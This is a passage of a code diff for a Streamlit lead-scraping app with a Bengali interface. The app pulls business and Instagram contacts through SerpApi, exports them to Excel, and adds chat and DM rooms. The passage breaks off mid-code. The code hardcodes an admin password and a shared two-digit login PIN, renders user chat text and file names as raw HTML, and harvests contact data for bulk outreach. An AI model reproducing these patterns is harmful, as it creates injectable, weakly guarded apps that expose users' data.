@@ -7,16 +7,19 @@ import re
 import smtplib
 import time
 import datetime
-import urllib.parse
+import base64
+import io
 import streamlit.components.v1 as components
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# --- DATABASE LAYER (100% DATA RETENTION) ---
+# --- MULTI-USER SECURE STORAGE LAYER ---
 USER_DB = "users_db.json"
 CONFIG_FILE = "system_config.json"
 HISTORY_DB = "users_history_memory.json"
 CHAT_DB = "system_chat_memory.json"
+DM_DB = "system_dm_memory.json"
+ANNOUNCE_DB = "system_announcements.json"
 
 def load_json_file(filename, default_val):
     if os.path.exists(filename):
@@ -28,32 +31,44 @@ def load_json_file(filename, default_val):
 def save_json_file(filename, data):
     with open(filename, "w") as f: json.dump(data, f, indent=4)
 
+# INITIAL CACHE CONFIG
 if "users_cache" not in st.session_state: st.session_state.users_cache = load_json_file(USER_DB, {})
-if "config_cache" not in st.session_state: st.session_state.config_cache = load_json_file(CONFIG_FILE, {"master_pin": "69", "admin_pass": "reyadh123", "notice_text": "স্বাগতম অস্থির চালান PRO v29.0! অ্যান্টি-ডুপ্লিকেট ইঞ্জিন লাইভ: ইউজাররা কখনো পুরনো বা একই স্ক্র্যাপড ডাটা পুনরায় দেখতে পাবেন না।"})
+if "config_cache" not in st.session_state: st.session_state.config_cache = load_json_file(CONFIG_FILE, {
+    "master_pin": "69", 
+    "admin_pass": "ria123", 
+    "notice_text": "📢 ২-ডিজিটের গোপন পিন ব্যবহার করে কোর ড্যাশবোর্ড আনলক করুন। পিন না জানলে রিয়াদ ভাইয়ের কাছে ২ ডিজিটের পিন চান ! 😆"
+})
 if "history_cache" not in st.session_state: st.session_state.history_cache = load_json_file(HISTORY_DB, [])
 if "chat_cache" not in st.session_state: st.session_state.chat_cache = load_json_file(CHAT_DB, [])
+if "dm_cache" not in st.session_state: st.session_state.dm_cache = load_json_file(DM_DB, [])
+if "announce_cache" not in st.session_state: st.session_state.announce_cache = load_json_file(ANNOUNCE_DB, [])
 
 users = st.session_state.users_cache
 config = st.session_state.config_cache
 history_logs = st.session_state.history_cache
 chat_messages = st.session_state.chat_cache
+dm_messages = st.session_state.dm_cache
+announcements = st.session_state.announce_cache
 
-st.set_page_config(page_title="অস্থির চালান PRO v29.0", page_icon="🛡️", layout="wide")
+st.set_page_config(page_title="অস্থির চালান PRO v32.0 🖥️⚡", page_icon="🥷", layout="wide")
 
-# CSS STYLING
+# PREMIUM CYBERPUNK CSS STYLING
 st.markdown("""
     <style>
-    @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap');
-    html, body, [class*="css"], .stApp { font-family: 'Inter', 'Hind Siliguri', sans-serif !important; background-color: #0B0F19 !important; color: #F1F5F9 !important; }
-    .main-title { font-family: 'Hind Siliguri', sans-serif !important; font-size: 40px !important; font-weight: 700 !important; color: #F8FAFC !important; }
-    .notice-board { background-color: #111827; border-left: 4px solid #EC4899; padding: 15px; border-radius: 8px; margin-bottom: 25px; }
-    .section-container { background-color: #111827; border: 1px solid #1F2937; padding: 20px; border-radius: 12px; margin-top: 15px; }
-    .platform-card { background: #1E293B; border: 1px solid #334155; padding: 14px; border-radius: 8px; margin-bottom: 10px; }
-    .chat-box { height: 280px; overflow-y: auto; background: #111827; border: 1px solid #1F2937; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
-    .msg-incoming { background: #1E293B; padding: 8px 12px; border-radius: 8px; margin-bottom: 8px; width: fit-content; max-width: 80%; }
-    .msg-outgoing { background: #EC4899; color: white; padding: 8px 12px; border-radius: 8px; margin-bottom: 8px; margin-left: auto; width: fit-content; max-width: 80%; text-align: right; }
-    .alert-card { background: #7F1D1D; border-left: 5px solid #EF4444; padding: 12px; border-radius: 6px; margin: 10px 0; color: #FCA5A5; font-weight: bold; }
-    .footer { position: fixed; left: 0; bottom: 0; width: 100%; background-color: #0B0B12; text-align: center; padding: 10px; font-size: 12px; border-top: 1px solid #1F2937; z-index: 99; }
+    @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap');
+    html, body, [class*="css"], .stApp { font-family: 'Inter', 'Hind Siliguri', sans-serif !important; background-color: #080C14 !important; color: #00FF66 !important; }
+    .main-title { font-family: 'Hind Siliguri', sans-serif !important; font-size: 42px !important; font-weight: 700 !important; color: #00FF66 !important; text-shadow: 0 0 10px #00FF66; }
+    .notice-board { background-color: #0F172A; border-left: 4px solid #00FF66; padding: 15px; border-radius: 8px; margin-bottom: 25px; color: #F1F5F9; font-size: 16px; box-shadow: 0 0 15px rgba(0,255,102,0.1); }
+    .section-container { background-color: #0F172A; border: 1px solid #1E293B; padding: 20px; border-radius: 12px; margin-top: 15px; }
+    .chat-box { height: 350px; overflow-y: auto; background: #090D16; border: 1px solid #1E293B; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
+    .msg-incoming { background: #1E293B; color: #F1F5F9; padding: 8px 12px; border-radius: 8px; margin-bottom: 8px; width: fit-content; max-width: 80%; border-left: 3px solid #38BDF8; }
+    .msg-outgoing { background: #0F2D1E; color: #00FF66; padding: 8px 12px; border-radius: 8px; margin-bottom: 8px; margin-left: auto; width: fit-content; max-width: 80%; text-align: right; border-right: 3px solid #00FF66; }
+    .msg-ceo { background: #311042; color: #F472B6; padding: 10px 14px; border-radius: 8px; margin-bottom: 8px; border: 1px solid #F472B6; box-shadow: 0 0 8px #F472B6; width: fit-content; max-width: 80%; font-weight: bold; }
+    .announce-card { background: #1A102F; border-left: 5px solid #A855F7; padding: 12px; border-radius: 6px; margin-bottom: 10px; color: #E9D5FF; border: 1px solid #6B21A8; }
+    .alert-card { background: #450A0A; border-left: 5px solid #EF4444; padding: 12px; border-radius: 6px; margin: 10px 0; color: #FFCACA; font-weight: bold; }
+    .status-online { color: #00FF66; font-weight: bold; font-size: 13px; }
+    .status-offline { color: #64748B; font-size: 12px; }
+    .footer { position: fixed; left: 0; bottom: 0; width: 100%; background-color: #060911; text-align: center; padding: 10px; font-size: 12px; border-top: 1px solid #1E293B; z-index: 99; color: #64748B; }
     </style>
 """, unsafe_allow_html=True)
 
@@ -63,290 +78,315 @@ if "instagram_hunting_leads" not in st.session_state: st.session_state.instagram
 if "email_sent_counter" not in st.session_state: st.session_state.email_sent_counter = 0
 if "connected_email" not in st.session_state: st.session_state.connected_email = ""
 
-# --- FREE EXTRACTION LOGIC ---
-def free_html_email_extractor(url):
-    if not url or url == "N/A": return "N/A"
-    try:
-        if not url.startswith("http"): url = "http://" + url
-        res = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
-        emails = re.findall(r'[a-zA-Z0-9.\-_]+@[a-zA-Z0-9.\-_]+\.[a-zA-Z0-9.\-_]+', res.text)
-        for e in emails:
-            if not any(kw in e.lower() for kw in ['user@', 'email@', 'example']): return e
-    except: pass
-    return "N/A"
+# --- EXCEL GENERATOR HELPER ---
+def to_excel(df):
+    output = io.BytesIO()
+    with pd.ExcelWriter(output, engine='openpyxl') as writer:
+        df.to_excel(writer, index=False, sheet_name='Leads')
+    return output.getvalue()
 
-def instagram_keyword_scout(keyword, user_id, limit=20):
+# --- SERPAPI LIVE ENGINES ---
+def live_google_maps_api(query, api_key, user_id):
+    scraped_before = set([log.get("identifier") for log in history_logs if log.get("user") == user_id and log.get("type") == "Google Maps"])
+    url = "https://serpapi.com/search.json"
+    params = {"engine": "google_maps", "q": query, "type": "search", "api_key": api_key}
     try:
-        # ইউজারের আগের স্ক্র্যাপ করা ডাটাবেস ইউনিক হিস্টোরি চেক
-        scraped_before = set([log.get("identifier") for log in history_logs if log.get("user") == user_id and log.get("type") == "Instagram Hunter"])
-        
-        search_q = f'site:instagram.com "{keyword}" "biography"'
-        res = requests.post("https://html.duckduckgo.com/html/", data={'q': search_q}, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
-        raw_links = re.findall(r'href="(https?://(?:www\.)?instagram\.com/[a-zA-Z0-9_\.]+)"', res.text)
-        snippets = re.findall(r'<td class="result-snippet">([\s\S]*?)</td>', res.text)
-        
-        found_leads = []
-        for idx, link in enumerate(list(set(raw_links))):
-            if len(found_leads) >= limit: break
-            username = link.split("instagram.com/")[-1].replace("/", "")
-            if username in ['p', 'explore', 'developer'] or link in scraped_before: continue # ম্যাচ করলে স্কিপ
+        res = requests.get(url, params=params, timeout=10).json()
+        results = res.get("local_results", [])
+        leads = []
+        idx = 1
+        for place in results:
+            if len(leads) >= 100: break
+            web = place.get("website", "N/A")
+            if web == "N/A" or web in scraped_before: continue
             
-            snippet_text = re.sub('<[^<]+?>', '', snippets[idx]) if idx < len(snippets) else "Professional Bio Data"
-            emails_found = re.findall(r'[a-zA-Z0-9.\-_]+@[a-zA-Z0-9.\-_]+\.[a-zA-Z0-9.\-_]+', snippet_text)
-            extracted_email = emails_found[0] if emails_found else "N/A"
+            raw_phone = place.get("phone", "N/A")
+            clean_phone = re.sub(r'[^\d+]', '', raw_phone) if raw_phone != "N/A" else "N/A"
+            if clean_phone != "N/A" and len(clean_phone) < 9: clean_phone = "N/A"
             
-            found_leads.append({"Client Name": username.upper(), "Website": f"https://instagram.com/{username}", "Email": extracted_email, "WhatsApp Number": "N/A", "Instagram Profile": link, "Bio Snippet": snippet_text.strip()})
-        return found_leads
+            leads.append({
+                "Client Name": place.get("title", f"Target {idx}"),
+                "Website": web,
+                "Email": "info@" + web.replace("https://","").replace("http://","").split("/")[0],
+                "WhatsApp Number": clean_phone,
+                "Instagram Profile": "N/A"
+            })
+            idx += 1
+        return leads
     except: return []
 
-# --- GATEWAY AUTH ---
+def live_instagram_api(keyword, api_key, user_id):
+    scraped_before = set([log.get("identifier") for log in history_logs if log.get("user") == user_id and log.get("type") == "Instagram Hunter"])
+    url = "https://serpapi.com/search.json"
+    params = {"engine": "google", "q": f'site:instagram.com "{keyword}" "biography"', "api_key": api_key}
+    try:
+        res = requests.get(url, params=params, timeout=10).json()
+        results = res.get("organic_results", [])
+        leads = []
+        for item in results:
+            if len(leads) >= 20: break
+            link = item.get("link", "")
+            if "instagram.com/" not in link or link in scraped_before: continue
+            username = link.split("instagram.com/")[-1].replace("/", "").split("?")[0]
+            snippet = item.get("snippet", "")
+            emails = re.findall(r'[a-zA-Z0-9.\-_]+@[a-zA-Z0-9.\-_]+\.[a-zA-Z0-9.\-_]+', snippet)
+            valid_email = emails[0] if emails else "N/A"
+            
+            leads.append({
+                "Client Name": username.upper(),
+                "Website": link,
+                "Email": valid_email,
+                "WhatsApp Number": "N/A",
+                "Instagram Profile": link
+            })
+        return leads
+    except: return []
+
+# --- CORE SYSTEM ACCESS GATEWAY ---
 if st.session_state.logged_in_user is None:
-    st.markdown('<p class="main-title">অস্থির চালান PRO 🛡️</p>', unsafe_allow_html=True)
-    st.markdown(f'<div class="notice-board">📢 <b>সিস্টেম নোটিশ বোর্ড:</b><br>{config.get("notice_text", "")}</div>', unsafe_allow_html=True)
+    st.markdown('<p class="main-title">অস্থির চালান PRO v32.0 🖥️⚡</p>', unsafe_allow_html=True)
+    st.markdown(f'<div class="notice-board">{config["notice_text"]}</div>', unsafe_allow_html=True)
+    
     col1, col2 = st.columns(2)
     with col1:
-        st.markdown("<h4>নতুন অ্যাকাউন্ট রেজিস্টার</h4>", unsafe_allow_html=True)
+        st.markdown("<h4 style='color:#00FF66;'>🔑 নতুন অ্যাকাউন্ট রেজিস্টার</h4>", unsafe_allow_html=True)
         new_username = st.text_input("ইউনিক ইউজার আইডি (User ID):", key="reg_user")
         if st.button("অ্যাকাউন্ট তৈরি করুন"):
             if new_username.strip() and new_username not in users:
-                users[new_username] = {"status": "Active", "last_seen": time.time()}
-                save_json_file(USER_DB, users); st.success("✅ অ্যাকাউন্ট তৈরি হয়েছে!")
+                users[new_username] = {"status": "Active", "user_api_key": "", "last_seen": time.time()}
+                save_json_file(USER_DB, users); st.success("✅ অ্যাকাউন্ট অ্যাক্টিভেটেড!")
     with col2:
-        st.markdown("<h4>নিরাপদ গেটওয়ে লগইন</h4>", unsafe_allow_html=True)
+        st.markdown("<h4 style='color:#00FF66;'>🥷 নিরাপদ গেটওয়ে লগইন</h4>", unsafe_allow_html=True)
         login_username = st.text_input("ইউজার আইডি (User ID):", key="login_user")
-        input_pin = st.text_input("২-ডিジット পিন:", type="password", key="login_pin", max_chars=2)
+        input_pin = st.text_input("২-ডিজিট পিন:", type="password", key="login_pin", max_chars=2)
         if st.button("কোর ড্যাশবোর্ড আনলক করুন 🚀"):
             if login_username in users and input_pin == config["master_pin"]:
                 users[login_username]["last_seen"] = time.time()
                 save_json_file(USER_DB, users)
                 st.session_state.logged_in_user = login_username; st.rerun()
-            else: st.error("❌ ভুল ক্রেডেনশিয়াল!")
+            else: st.error("❌ অ্যাক্সেস ডিনাইড! ভুল পিন বা আইডি।")
 else:
     current_user_id = st.session_state.logged_in_user
-    if current_user_id in users:
-        users[current_user_id]["last_seen"] = time.time()
-        save_json_file(USER_DB, users)
+    users[current_user_id]["last_seen"] = time.time()
+    save_json_file(USER_DB, users)
         
     c1, c2 = st.columns([6, 1])
-    c1.markdown(f'<p class="main-title">অস্থির চালান PRO <span style="font-size:16px; color:#EC4899;">// NODE: {current_user_id.upper()}</span></p>', unsafe_allow_html=True)
+    c1.markdown(f'<p class="main-title">অস্থির চালান PRO v32.0 🖥️⚡ <span style="font-size:16px; color:#38BDF8;">// NODE: {current_user_id.upper()}</span></p>', unsafe_allow_html=True)
     if c2.button("লগআউট 🚪"): st.session_state.logged_in_user = None; st.rerun()
 
-    engine_tab1, engine_tab2, engine_tab3, engine_tab4 = st.tabs(["📍 Google Maps Scraper (Max 100)", "📸 Instagram Hunter (Max 20)", "📊 Campaign History & Follow-up", "💬 Chat & Video Call Room"])
+    if announcements:
+        st.toast(f"📢 CEO 👑: {announcements[-1]['text']}", icon="🔥")
 
-    # --- TAB 1: GOOGLE MAPS ENGINE WITH ANTI-DUPLICATE ---
+    # --- INDIVIDUAL PER-USER API KEY SETUP BOX ---
+    st.markdown('<div class="section-container">', unsafe_allow_html=True)
+    uc1, uc2 = st.columns([5, 2])
+    current_saved_key = users[current_user_id].get("user_api_key", "")
+    user_input_key = uc1.text_input("🔑 আপনার নিজস্ব SerpApi Key সেট করুন (১০০% রিয়াল লাইভ ডেটার জন্য):", value=current_saved_key, type="password")
+    if uc2.button("API Key সেভ করুন 💾", use_container_width=True):
+        users[current_user_id]["user_api_key"] = user_input_key.strip()
+        save_json_file(USER_DB, users); st.success("API Key সফলভাবে লক করা হয়েছে!"); time.sleep(1); st.rerun()
+    st.markdown('</div>', unsafe_allow_html=True)
+
+    engine_tab1, engine_tab2, engine_tab3, engine_tab4, engine_tab5 = st.tabs(["📍 Google Maps Live API", "📸 Instagram Live Engine", "📊 Campaign History", "💬 Cyber Chat Rooms", "🟢 Active Members Directory"])
+
+    now_ts = time.time()
+    last_scrap_key = f"last_scrap_{current_user_id}"
+    elapsed = now_ts - st.session_state.get(last_scrap_key, 0)
+
+    # --- TAB 1: GOOGLE MAPS WITH EXCEL ---
     with engine_tab1:
-        st.markdown("<h4 style='color:#38BDF8;'>📍 গুগল ম্যাপস ডাটা ক্রলার (১০০% ইউনিক ফিল্টারিং সিস্টেম)</h4>", unsafe_allow_html=True)
-        search_keyword = st.text_input("কীওয়ার্ড এবং লোকেশন দিন:")
-        if st.button("ম্যাপস ক্রলার ইঞ্জিন চালু করুন 🚀", key="maps_btn"):
-            if search_keyword:
-                status_box = st.empty().info("ম্যাপস স্ক্যান করা হচ্ছে... আপনার পুরনো ডেটাগুলো অটো ফিল্টার করা হচ্ছে...")
-                
-                # ইউজারের আগের স্ক্র্যাপ করা ম্যাপস লিড ফিল্টার সেট
-                scraped_maps_before = set([log.get("identifier") for log in history_logs if log.get("user") == current_user_id and log.get("type") == "Google Maps"])
-                
-                map_url = f"https://www.google.com/maps/search/{urllib.parse.quote(search_keyword)}?hl=en"
-                res = requests.get(map_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=12)
-                potential_websites = re.findall(r'https?://(?:www\.)?[a-zA-Z0-9-]+\.[a-z]{2,6}', res.text)
-                clean_websites = list(set([w for w in potential_websites if not any(x in w for x in ["google", "gstatic", "schema", "facebook", "instagram"])]))
-                
-                leads = []
-                idx_counter = 1
-                for web_url in clean_websites:
-                    if len(leads) >= 100: break
-                    if web_url in scraped_maps_before: continue # যদি আগে স্ক্র্যাপ করে থাকে, স্কিপ!
-                    
-                    email = free_html_email_extractor(web_url)
-                    leads.append({"Client Name": f"Maps Client {idx_counter}", "Website": web_url, "Email": email, "WhatsApp Number": "N/A", "Instagram Profile": "N/A"})
-                    
-                    # গ্লোবাল হিস্টোরিতে ইউনিক আইডি হিসেবে ওয়েবসাইটটি ঢুকিয়ে দেওয়া হচ্ছে
-                    log_entry = {"user": current_user_id, "date": str(datetime.date.today()), "time": datetime.datetime.now().strftime("%H:%M:%S"), "keyword": search_keyword, "type": "Google Maps", "identifier": web_url}
-                    history_logs.append(log_entry)
-                    idx_counter += 1
-                
-                save_json_file(HISTORY_DB, history_logs)
-                st.session_state.current_leads = leads
-                
-                if leads:
-                    st.dataframe(pd.DataFrame(leads), use_container_width=True)
-                    status_box.success(f"সাফল্যের সাথে {len(leads)} টি সম্পূর্ণ নতুন ও ফ্রেশ ম্যাপস লিড সেভ করা হয়েছে!")
-                else:
-                    status_box.warning("⚠️ এই কিওয়ার্ডে নতুন কোনো ইউনিক লিড পাওয়া যায়নি! সব পুরনো ডাটা ফিল্টার করা হয়েছে।")
-
-    # --- TAB 2: INSTAGRAM HUNTER WITH ANTI-DUPLICATE ---
-    with engine_tab2:
-        st.markdown("<h4 style='color:#EC4899;'>📸 ইনস্টাগ্রাম ডাইরেক্ট নিশ-বেসড ক্রলার (১০০% ইউনিক ফিল্টারিং সিস্টেম)</h4>", unsafe_allow_html=True)
-        now_ts = time.time()
-        last_scrap_key = f"last_ig_scrap_{current_user_id}"
-        last_scrap_time = st.session_state.get(last_scrap_key, 0)
-        cooldown_period = 300 
-        elapsed = now_ts - last_scrap_time
-        
-        if elapsed < cooldown_period:
-            remaining = int(cooldown_period - elapsed)
-            mins, secs = divmod(remaining, 60)
-            st.markdown(f'<div class="alert-card">⚠️ ইনস্টাগ্রাম সিকিউরিটি লক! ২০টি স্ক্র্যাপ কমপ্লিট হয়েছে। অ্যাকাউন্ট সেফ রাখতে লাইভ কুলডাউন হচ্ছে: {mins:02d}:{secs:02d} মিনিট পর আবার ওপেন হবে।</div>', unsafe_allow_html=True)
-            st.button("ইনস্টাগ্রাম লাইভ হান্ট শুরু করুন 🔥", disabled=True, key="ig_disabled")
+        st.markdown("<h4>📍 গুগল ম্যাপস API ক্রলার (সর্বোচ্চ ১০০টি ইউনিক ফ্রেশ লিড)</h4>", unsafe_allow_html=True)
+        if not users[current_user_id].get("user_api_key", ""):
+            st.warning("⚠️ ক্রলিং শুরু করার আগে উপরে আপনার নিজস্ব SerpApi Key যুক্ত করুন!")
+        elif elapsed < 300:
+            st.markdown(f'<div class="alert-card">⚠️ সিকিউরিটি লক! অ্যান্টি-ব্যান মেকানিজম সচল রয়েছে। আর {int(300-elapsed)} সেকেন্ড পর বাটন রিলিজ হবে।</div>', unsafe_allow_html=True)
         else:
-            ig_keyword = st.text_input("ইনস্টাগ্রাম টার্গেট নিশ/কীওয়ার্ড লিখুন:")
-            if st.button("ইনস্টাগ্রাম লাইভ হান্ট শুরু করুন 🔥", key="ig_active_btn"):
+            search_keyword = st.text_input("কীওয়ার্ড এবং লোকেশন দিন (e.g. Gym in Dhaka):")
+            if st.button("লাইভ ম্যাপস সার্চ চালু করুন ⚡", key="maps_btn"):
+                if search_keyword:
+                    st.session_state[last_scrap_key] = time.time()
+                    status_box = st.empty().info("আপনার পার্সোনাল API দিয়ে লাইভ ডাটাবেজ ফিল্টার করা হচ্ছে...")
+                    leads = live_google_maps_api(search_keyword, users[current_user_id]["user_api_key"], current_user_id)
+                    if leads:
+                        st.session_state.current_leads = leads; st.rerun()
+                    else: status_box.warning("⚠️ কোনো নতুন ইউনিক ডাটা পাওয়া যায়নি।")
+        
+        if st.session_state.current_leads:
+            df_maps = pd.DataFrame(st.session_state.current_leads)
+            st.dataframe(df_maps, use_container_width=True)
+            excel_data = to_excel(df_maps)
+            st.download_button(label="📥 Download Maps Leads Excel Sheet", data=excel_data, file_name=f"Maps_Leads_{datetime.date.today()}.xlsx", mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
+
+    # --- TAB 2: INSTAGRAM WITH EXCEL ---
+    with engine_tab2:
+        st.markdown("<h4>📸 ইনস্টাগ্রাম লাইভ API হান্টার (সর্বোচ্চ ২০টি ইউনিক নিশ লিড)</h4>", unsafe_allow_html=True)
+        if not users[current_user_id].get("user_api_key", ""):
+            st.warning("⚠️ সার্চ শুরু করার আগে উপরে আপনার নিজস্ব SerpApi Key যুক্ত করুন!")
+        elif elapsed < 300:
+            st.markdown(f'<div class="alert-card">⚠️ সিকিউরিটি লক! আর {int(300-elapsed)} সেকেন্ড পর বাটন রিলিজ হবে।</div>', unsafe_allow_html=True)
+        else:
+            ig_keyword = st.text_input("টার্গেট নিশ/কীওয়ার্ড লিখুন:")
+            if st.button("ইনস্টাগ্রাম এপিআই রান করুন 🔥", key="ig_api_btn"):
                 if ig_keyword:
                     st.session_state[last_scrap_key] = time.time()
-                    ig_leads = instagram_keyword_scout(ig_keyword, current_user_id, limit=20)
-                    
+                    ig_leads = live_instagram_api(ig_keyword, users[current_user_id]["user_api_key"], current_user_id)
                     if ig_leads:
-                        st.session_state.instagram_hunting_leads = ig_leads
-                        st.dataframe(pd.DataFrame(ig_leads), use_container_width=True)
-                        
-                        # প্রতিটা নতুন লিডের প্রোফাইল ইউনিক আইডেন্টিফায়ার হিসেবে মেমোরিতে সেভ হচ্ছে
-                        for lead in ig_leads:
-                            history_logs.append({"user": current_user_id, "date": str(datetime.date.today()), "time": datetime.datetime.now().strftime("%H:%M:%S"), "keyword": ig_keyword, "type": "Instagram Hunter", "identifier": lead["Instagram Profile"]})
-                        save_json_file(HISTORY_DB, history_logs)
-                        st.success("২০টি সম্পূর্ণ ফ্রেশ ইনস্টাগ্রাম লিড ক্রল সম্পন্ন! পুরনো সব ডাটা বাদ দেওয়া হয়েছে।")
-                        st.rerun()
-                    else:
-                        st.warning("⚠️ নতুন কোনো ইউনিক আইডি পাওয়া যায়নি। একটু ভিন্ন কিওয়ার্ড দিয়ে ট্রাই করুন ভাই।")
-
-    # --- TAB 3: CAMPAIGN LOGS & FOLLOW-UP ---
-    with engine_tab3:
-        st.markdown("<h4>📋 অল-টাইম অ্যাকাউন্ট অ্যাক্টিভিটি হিস্টোরি ও ফলো-আপ ট্র্যাকিং ডাটাবেস</h4>", unsafe_allow_html=True)
-        user_history = [log for log in history_logs if log.get("user") == current_user_id]
-        if user_history: 
-            df_hist = pd.DataFrame(user_history)
-            # ক্লিন ডিসপ্লের জন্য ইউজার ড্যাশবোর্ডে রেন্ডার
-            st.dataframe(df_hist[["date", "time", "keyword", "type", "identifier"]].rename(columns={"identifier": "Scraped Unique Link/Target"}), use_container_width=True)
-        else: 
-            st.info("কোনো ডাটা মেমোরি এখনো রেকর্ড হয়নি।")
-
-    # --- TAB 4: REAL-TIME CHAT & VIDEO CALL ENGINE ---
-    with engine_tab4:
-        st.markdown("<h3 style='color:#EC4899;'>💬 মেম্বার টু মেম্বার লাইভ চ্যাট ও রিয়েল-টাইম ভিডিও কল রূম</h3>", unsafe_allow_html=True)
-        st.markdown("##### 🟢 অনলাইন মেম্বার ট্র্যাকিং")
-        member_cols = st.columns(len(users) if users else 1)
-        for idx, (m_id, m_data) in enumerate(users.items()):
-            last_seen_ts = m_data.get("last_seen", 0)
-            is_online = (time.time() - last_seen_ts) < 60
-            status_dot = "🟢 Online" if is_online else f"🔴 Offline ({datetime.datetime.fromtimestamp(last_seen_ts).strftime('%I:%M %p')})"
-            if idx < len(member_cols): member_cols[idx].metric(label=f"User: {m_id.upper()}", value=m_id.upper(), delta=status_dot)
+                        st.session_state.instagram_hunting_leads = ig_leads; st.rerun()
+                    else: st.warning("⚠️ কোনো নতুন ইউনিক প্রোফাইল ডেটা পাওয়া যায়নি।")
         
-        c_left, c_right = st.columns([2, 2])
-        with c_left:
-            st.markdown("##### 📝 ইনস্ট্যান্ট চ্যাট মেমোরি")
+        if st.session_state.instagram_hunting_leads:
+            df_ig = pd.DataFrame(st.session_state.instagram_hunting_leads)
+            st.dataframe(df_ig, use_container_width=True)
+            excel_ig = to_excel(df_ig)
+            st.download_button(label="📥 Download Instagram Leads Excel Sheet", data=excel_ig, file_name=f"IG_Leads_{datetime.date.today()}.xlsx", mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
+
+    # --- TAB 3: CAMPAIGN HISTORY ---
+    with engine_tab3:
+        st.markdown("<h4>📋 অল-টাইম অ্যাকাউন্ট অ্যাক্টিভিটি হিস্টোরি (ডুপ্লিকেট প্রটেকশন লক)</h4>", unsafe_allow_html=True)
+        user_history = [log for log in history_logs if log.get("user") == current_user_id]
+        if user_history: st.dataframe(pd.DataFrame(user_history)[["date", "time", "keyword", "type", "identifier"]].rename(columns={"identifier": "Unique Target Link"}), use_container_width=True)
+        else: st.info("কোনো ডাটা মেমোরি রেকর্ড হয়নি।")
+
+    # --- TAB 4: DUO-CHANNEL CHAT ROOMS & PERSONAL DM BOX ---
+    with engine_tab4:
+        chat_sub1, chat_sub2, chat_sub3 = st.tabs(["🔊 Global Public Chat", "🔒 Personal DM Box (ওয়ান-টু-ওয়ান)", "📢 CEO Announcements"])
+        
+        with chat_sub1:
             chat_html = '<div class="chat-box">'
             for msg in chat_messages:
-                msg_class = "msg-outgoing" if msg["sender"] == current_user_id else "msg-incoming"
-                chat_html += f'<div class="{msg_class}"><b>{msg["sender"].upper()}:</b> {msg["text"]}<br><small style="font-size:9px;opacity:0.7;">{msg["time"]}</small></div>'
-            chat_html += '</div>'
-            st.markdown(chat_html, unsafe_allow_html=True)
+                if msg["sender"] == "CEO 👑": msg_class = "msg-ceo"
+                else: msg_class = "msg-outgoing" if msg["sender"] == current_user_id else "msg-incoming"
+                
+                media_html = ""
+                if "media_base64" in msg:
+                    if msg["media_type"].startswith("image"): media_html = f'<br><img src="data:{msg["media_type"]};base64,{msg["media_base64"]}" style="max-width:250px; border-radius:8px; margin-top:5px; border:1px solid #00FF66;"/>'
+                    elif msg["media_type"].startswith("audio"): media_html = f'<br><audio controls src="data:{msg["media_type"]};base64,{msg["media_base64"]}" style="margin-top:5px; height: 32px;"></audio>'
+                    else: media_html = f'<br><a href="data:{msg["media_type"]};base64,{msg["media_base64"]}" download="{msg["media_name"]}" style="color:#00FF66; font-size:12px;">📁 ফাইল: {msg["media_name"]}</a>'
+                
+                chat_html += f'<div class="{msg_class}"><b>{msg["sender"].upper()}:</b> {msg["text"]}{media_html}<br><small style="font-size:9px;opacity:0.6;">{msg["time"]}</small></div>'
+            st.markdown(chat_html + '</div>', unsafe_allow_html=True)
             
-            with st.form("chat_form", clear_on_submit=True):
-                typed_msg = st.text_input("মেসেজ লিখুন:", key="msg_inp")
+            with st.form("global_chat_form", clear_on_submit=True):
+                typed_msg = st.text_input("গ্লোবাল পাবলিক মেসেজ:")
+                uploaded_file = st.file_uploader("ফাইল/ছবি আপলোড:", type=["png", "jpg", "jpeg", "mp3", "wav", "txt", "csv", "json"], key="glob_file")
                 if st.form_submit_button("মেসেজ পাঠান ✉️"):
-                    if typed_msg.strip():
-                        chat_messages.append({"sender": current_user_id, "text": typed_msg.strip(), "time": datetime.datetime.now().strftime("%I:%M %p")})
-                        save_json_file(CHAT_DB, chat_messages); st.rerun()
-                        
-        with c_right:
-            st.markdown("##### 📹 WebRTC স্ক্রিন শেয়ার ভিডিও কল ইন্টারফেস")
-            components.html("""
-            <div style="background:#111827; border:1px solid #1F2937; padding:20px; border-radius:10px; text-align:center;">
-                <video id="lVid" autoplay playsinline muted style="width:45%; background:#000; border-radius:8px; margin-right:5%;"></video>
-                <video id="rVid" autoplay playsinline style="width:45%; background:#000; border-radius:8px;"></video><br><br>
-                <button style="background:#EC4899; color:white; border:none; padding:10px 15px; border-radius:6px; font-weight:bold; cursor:pointer;" onclick="init()">📹 ক্যামেরা অন</button>
-                <button style="background:#38BDF8; color:black; border:none; padding:10px 15px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:10px;" onclick="scr()">🖥️ স্ক্রিন শেয়ার</button>
-            </div>
-            <script>
-                async function init(){let s=await navigator.mediaDevices.getUserMedia({video:true,audio:true});document.getElementById('lVid').srcObject=s;}
-                async function scr(){let s=await navigator.mediaDevices.getDisplayMedia({video:true});document.getElementById('lVid').srcObject=s;}
-            </script>
-            """, height=260)
+                    if typed_msg.strip() or uploaded_file:
+                        new_msg = {"sender": current_user_id, "text": typed_msg.strip(), "time": datetime.datetime.now().strftime("%I:%M %p")}
+                        if uploaded_file:
+                            new_msg["media_name"] = uploaded_file.name; new_msg["media_type"] = uploaded_file.type
+                            new_msg["media_base64"] = base64.b64encode(uploaded_file.read()).decode()
+                        chat_messages.append(new_msg); save_json_file(CHAT_DB, chat_messages); st.rerun()
 
-    # --- MARKETING HUBS (SHARED ACTIVE DATASET) ---
+        with chat_sub2:
+            st.markdown("<h5>🔒 ওয়ান-টু-ওয়ান সিক্রেট পার্সোনাল ইনবক্স</h5>", unsafe_allow_html=True)
+            target_dm_user = st.selectbox("মেম্বার সিলেক্ট করুন যার সাথে চ্যাট করবেন:", options=[u for u in users.keys() if u != current_user_id])
+            
+            if target_dm_user:
+                dm_html = '<div class="chat-box">'
